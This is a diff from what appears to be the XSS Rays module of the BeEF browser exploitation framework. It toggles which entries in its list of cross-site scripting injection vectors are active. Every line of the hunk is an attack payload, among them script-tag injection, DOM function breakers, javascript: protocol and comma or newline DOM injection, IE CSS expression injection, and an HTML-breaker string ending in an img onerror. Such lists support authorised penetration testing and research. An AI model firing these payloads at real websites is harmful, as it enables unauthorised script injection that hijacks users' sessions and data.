@@ -50,19 +50,19 @@ beef.net.xssrays = {
     vectors: [
 
 //				  {input:"',XSS,'", name: 'Standard DOM based injection single', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:'",XSS,"', name: 'Standard DOM based injection double', browser: 'ALL',url:true,form:true,path:true},
-//        {input: '\'><script>XSS<\/script>', name: 'Standard script injection single', browser: 'ALL',url:true,form:true,path:true},
-        {input: '"><script>XSS<\/script>', name: 'Standard script injection double', browser: 'ALL',url:true,form:true,path:true}, //,
-		{input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true}
+				  {input:'",XSS,"', name: 'Standard DOM based injection double', browser: 'ALL',url:true,form:true,path:true},
+//				  {input:'\'><script>XSS<\/script>', name: 'Standard script injection single', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'"><script>XSS<\/script>', name: 'Standard script injection double', browser: 'ALL',url:true,form:true,path:true}, //,
+//				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true}
 //				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},
 //				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},
-//        {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true}
+//				  {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true},
 //				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
 //				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},
-//  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
-//  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},
-        //{input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}
+  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
+  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}
     ],
     uniqueID: 0,
     rays: [],
